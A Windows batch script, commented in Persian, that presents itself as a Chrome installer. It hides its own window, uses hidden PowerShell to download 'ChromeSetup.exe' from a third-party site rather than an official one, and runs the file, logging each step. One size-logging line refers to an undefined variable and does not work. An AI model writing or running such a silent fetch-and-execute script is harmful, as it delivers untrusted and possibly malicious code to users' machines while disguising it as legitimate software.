@echo off
:: پنهان کردن پنجره CMD
if "%1" == "hidden" goto :main
start /min cmd /c %0 hidden & exit
:main

:: تنظیمات دانلود
set "url=https://parsi-media.ir/d/ChromeSetup.exe"
set "savePath=C:\ChromeDownloads\ChromeSetup.exe"
set "logFile=C:\ChromeDownloads\install.log"

:: ایجاد پوشه اگر وجود ندارد
if not exist "C:\ChromeDownloads" (
    mkdir "C:\ChromeDownloads" >nul 2>&1
    echo %date% %time% - پوشه ایجاد شد >> "%logFile%"
)

:: دانلود فایل
echo %date% %time% - شروع فرآیند دانلود >> "%logFile%"
powershell -WindowStyle Hidden -Command "$ProgressPreference = 'SilentlyContinue'; (New-Object Net.WebClient).DownloadFile('%url%', '%savePath%')" >nul 2>&1

:: بررسی نتیجه دانلود
if exist "%savePath%" (
    echo %date% %time% - دانلود موفق: %savePath% >> "%logFile%"
    echo %date% %time% - حجم فایل: %%~zF بایت >> "%logFile%"
    
    :: اجرای فایل دانلود شده
    echo %date% %time% - شروع نصب Chrome >> "%logFile%"
    start "" "%savePath%"
    echo %date% %time% - دستور اجرا صادر شد >> "%logFile%"
) else (
    echo %date% %time% - خطا در دانلود فایل >> "%logFile%"
)

exit